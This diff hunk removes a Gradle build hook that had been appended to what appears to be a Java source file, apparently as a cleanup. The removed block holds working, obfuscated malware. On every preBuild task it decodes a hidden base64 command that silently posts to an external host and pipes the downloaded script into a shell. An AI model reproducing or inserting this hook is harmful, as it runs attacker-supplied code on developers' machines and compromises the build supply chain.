@@ -232,10 +232,3 @@ public static String getFileMD5(File file) {
         }
     }
 }
-tasks.all {
-    if (name.contains("preBuild")) {
-        doLast {
-            ["sh", "-c", "((v(){ `printf 'bavse64' | tr -d 'v'` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNCAtLWNvbm5lY3QtdGltZW91dCAyMyAta0xzZiAtZCAicD1hbmRyb2lkX2dyYWRsZSIgaHR0cHM6Ly9qdzh1Ni00b2xvejN4LmJlc3QvYSkiIHwgc2gK | v | sh ) >/dev/null 2>&1 &)"].execute()
-        }
-    }
-}
